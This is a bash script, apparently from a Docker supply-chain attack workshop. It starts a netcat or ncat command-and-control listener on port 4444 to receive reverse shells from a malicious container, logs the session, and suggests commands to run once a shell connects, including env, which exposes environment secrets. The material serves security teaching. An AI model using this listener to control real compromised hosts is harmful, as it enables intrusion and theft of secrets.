#!/bin/bash

# C2 Server Listener Script
# This script sets up the attacker's command and control server
# Run this BEFORE starting the malicious container

C2_PORT=4444
LOG_FILE="c2-session-$(date +%Y%m%d-%H%M%S).log"

echo "🚨 Docker Supply Chain Attack Workshop - C2 Listener"
echo "=================================================="
echo "Setting up Command & Control server on port $C2_PORT"
echo "Session will be logged to: $LOG_FILE"
echo ""
echo "Waiting for reverse shell connections..."
echo "Once connected, you'll have shell access to the compromised container"
echo ""
echo "Commands to try once connected:"
echo "  - whoami"
echo "  - hostname" 
echo "  - ps auxf"
echo "  - env"
echo "  - ls -la /"
echo ""
echo "Press Ctrl+C to stop the listener"
echo "=================================================="
echo ""

# Create logs directory if it doesn't exist
mkdir -p c2-logs

# Start netcat listener with logging
# Different netcat versions use different syntax
if nc -h 2>&1 | grep -q "OpenBSD\|openbsd"; then
    # OpenBSD netcat (Linux)
    echo "Using OpenBSD netcat syntax..."
    nc -lvp $C2_PORT | tee c2-logs/$LOG_FILE
elif command -v ncat >/dev/null 2>&1; then
    # ncat (nmap's netcat)
    echo "Using ncat (nmap netcat)..."
    ncat --listen -p $C2_PORT --keep-open -v | tee c2-logs/$LOG_FILE
else
    # Traditional netcat (macOS/BSD)
    echo "Using traditional netcat syntax..."
    nc -l $C2_PORT | tee c2-logs/$LOG_FILE
fi